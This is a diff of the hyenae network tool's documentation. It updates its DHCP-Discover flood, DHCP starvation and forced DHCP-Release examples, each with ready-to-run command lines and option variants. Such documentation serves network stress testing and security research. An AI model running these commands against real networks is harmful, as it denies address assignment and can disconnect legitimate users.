@@ -138,28 +138,37 @@
     5.6 DHCP-Discover flood
 
     This attack will send an unlimited amount of DHCP-Discover packets from a
-    random source to all available DHCP-Servers on the network.
+    random source to all available machines on the network. The second example
+    shows the same attack with activated "Requested IP-Address" option.
 
     # hyenae -I 3 -a dhcp-discover -s %-0.0.0.0 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255
 
-    5.7 DHCP-Starvation attack (Type 1)
+    # hyenae -I 3 -a dhcp-discover -s %-0.0.0.0 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S 192.168.0.%%
+
+    5.7 DHCP-Starvation attack
 
     This attack will send an unlimited amount of DHCP-Request packets from a
-    random source to request an unlimited amount of IP-Addresses from all
-    available DHCP-Servers on the network.
+    random source to all available machines on the network. The DHCP-Option
+    "Server Identifier" is set to the IP-Address of the destination DHCP-Server.
+    The second example shows the same attack with activated "Requested
+    IP-Address" option.
 
     # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
-    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S %
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.0.1
+
+    # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.0.1 -S %
 
     5.8 DHCP-Release forcing
 
     This attack will send a single DHCP-Release packet from a fictional source
-    address to all available DHCP-Servers on the network to have the used
-    IP-Address released by the DHCP-Server that is matching 192.168.0.1.
+    address to a fictional DHCP-Server. The DHCP-Option "Server Identifier" is
+    set to the IP-Address of the destination DHCP-Server.
 
     # hyenae -I 3 -a dhcp-release -s 11:22:33:44:55:66-192.168.0.2 \
-    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.1 -c 1
+    # -d 44:55:66:77:88:99-192.168.0.1 -D 192.168.0.1 -c 1
 
 --------------------------------------------------------------------------------
 
